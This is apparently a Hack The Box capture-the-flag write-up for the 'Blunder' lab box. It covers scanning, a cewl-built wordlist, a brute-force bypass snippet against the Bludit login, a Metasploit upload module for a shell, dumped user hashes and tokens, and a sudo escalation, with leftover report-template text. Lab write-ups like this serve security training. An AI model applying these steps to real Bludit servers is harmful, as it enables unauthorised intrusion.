---
title: "Hack The Box - Blunder"
date: "Jun 21 2020"
subject: "Hack The Box - Blunder"
keywords: [Blunder, Hack The Box]
subtitle: "Blunder walkthrough"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Hack The Box Remote Walktrough

## Introduction

This is a walkthrough of the box Blunder using Metasploit.

## Information about the box 

IP address: 10.10.10.191

OS: Linux 

Difficulty: Easy

Release: May 30 2020
#### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.191      | **TCP**: 80\


##### Nmap Scan Results
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:51 +08
Stats: 0:10:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.10.191
Host is up (0.39s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   308.21 ms 10.10.14.1
2   425.18 ms 10.10.10.191

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1376.98 seconds

```
Based on the nmap, only port 80 is open. 

##### web page

*source code*
when looking through the source code, there is nothing out of the ordinary.

*nikto scan*
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.191
+ Target Hostname:    10.10.10.191
+ Target Port:        80
+ Start Time:         2020-06-21 17:09:00 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Retrieved x-powered-by header: Bludit
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /admin/config.php: PHP Config file may contain database IDs and passwords.
+ /admin/cplogfile.log: DevBB 1.0 final (http://www.mybboard.com) log file is readable remotely. Upgrade to the latest version.
+ /admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.
+ OSVDB-3233: /admin/admin_phpinfo.php4: Mon Album from http://www.3dsrc.com version 0.6.2d allows remote admin access. This should be protected.
+ OSVDB-5034: /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify.
+ OSVDB-376: /admin/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin.
+ OSVDB-2813: /admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein
+ OSVDB-2922: /admin/wg_user-info.ml: WebGate Web Eye exposes user names and passwords.
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Transport endpoint is not connected
+ Scan terminated:  10 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-06-21 19:39:21 (GMT8) (9021 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.41) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
- Sent updated info to cirt.net -- Thank you!

```
*dirbuster*
````
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Jun 21 17:23:57 SGT 2020
--------------------------------

http://10.10.10.191:80
--------------------------------
Directories found during testing:

Dirs found with a 403 response:

/icons/
/icons/small/

Dirs found with a 200 response:

/
/admin/
/bl-kernel/
/bl-themes/
/bl-kernel/js/
/bl-kernel/admin/
/bl-kernel/abstract/
/bl-kernel/img/
/bl-themes/blogx/img/
/bl-kernel/ajax/
--------------- omitted --------------- 
/bl-kernel/admin/controllers/settings-general.php
/bl-themes/blogx/css/style.css
/robots.txt
/bl-themes/alternative/css/style.css
/bl-themes/social-network/css/style.css
/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css
/bl-kernel/admin/themes/booty/css/bludit.css
--------------- omitted --------------- 
/bl-kernel/admin/themes/booty/js/jquery-auto-complete.min.js
/bl-kernel/admin/themes/booty/js/jquery.datetimepicker.full.min.js
/todo.txt


--------------------------------

````
*/robots.txt*
![Image of robot.txt](https://github.com/friend-col/hack-the-box--blunder/blob/master/img/robots.jpg)

*/todo.txt*
todo.txt is a list of things that needs to be completed 
<insert img>

*/admin*
admin webpage is presented with a login page 
<insert img> 

Source code does not provide any credentials. 
Next, google is used to find out if there is any default credentials.
A directory was given where it the user's credentials were shown, thus the directory was being searched and there was nothing in the directory 

<insert img>

An article shows a script for Bludit Brute Force Bypass. 

** preperation **
 *generating a password list for the script to brute force* 
	A password list is generated using cewl. 
	Cewl is a  ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers 

	``` command: cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/ ```
		- -w wordlist.txt: the password generated by cewl will be written into the wordlist.txt file 
		- -d 10: Depth to spider to, the depth in this case is 10
		- -m 1: Minimum word length, the minimum word length in this case is 1 

 *preperating the code to for brute force*
   host was set to the IP address of the target machine 
   username was set to fregus, the username shown in todo.txt
   path of the password file was also set
   
   ``` 
	#snippet of the code
        host = 'http://10.10.10.191'
	login_url = host + '/admin/login'
	username = 'fergus'
	wordlist = open_ressources('/root/htb-blunder/wordlist.txt')
    ```

 *results* 
   username and password is fergus:RolandDeschain.

    ````
    [*] Trying: to
    [*] Trying: the
    [*] Trying: of
    ------- snip omitted -------
    [*] Trying: fictional
    [*] Trying: character
    [*] Trying: RolandDeschain

    ()
    SUCCESS: Password found!
    Use fergus:RolandDeschain to login.
    ()

    ````
*/robots.txt*
<insert img>

*/todo.txt*
todo.txt is a list of things that needs to be completed 
<insert img>

#### Gettting User Flag

*getting Reverse shell*

  By searching Bludit on metasploit, we found a module
	Name of module: exploit/linux/http/bludit_upload_images_exec
	Password: RolandDeschain
	Username: fergus

*checking the user id*
 ```
 www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 Going back to the databases directory to get all the usernames and passwords
 ````
 <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "aec02cfc0930f6f91cb27030cf25e2b2",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}
 ````
 ```
hugo@blunder:~$ cat user.txt
cat user.txt
6eb3f4773e49edbc246dd7238ed6a32a

```
#### Privilege Escalation

*Additional Priv Esc info*

**Vulnerability Exploited:**

Using command
```
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

```
root@blunder:/root# id 
id 
uid=0(root) gid=1001(hugo) groups=1001(hugo)
```

```
root@blunder:/root# cat root.txt
cat root.txt
ac767b447183a65169c00607a931dc03
```
**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

#### additional information about the exploit 

##### bludit bypass
 *Description*
   bl-kernel/security.class.php in Bludit 3.9.2 allows attackers to bypass a brute-force protection mechanism by using many different forged X-Forwarded-For or Client-IP HTTP headers
 *Serverity*
   CVSS 3.0 score: 9.8 Critial 

##### Directory Traversal Image File Upload 
 *Description*
  Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname
 *Serverity*
  CVSS 3.0 score: 8.8 High 

















































































































































## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, Alec removed all user accounts and passwords as well as the Meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.



# Additional Items

## Appendix - Proof and Local Contents:

IP (Hostname) | Local.txt Contents | Proof.txt Contents
--------------|--------------------|-------------------
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here

## Appendix - Metasploit/Meterpreter Usage

For the exam, I used my Metasploit/Meterpreter allowance on the following machine: `192.168.x.x`

## Appendix - Completed Buffer Overflow Code

```
code here
```
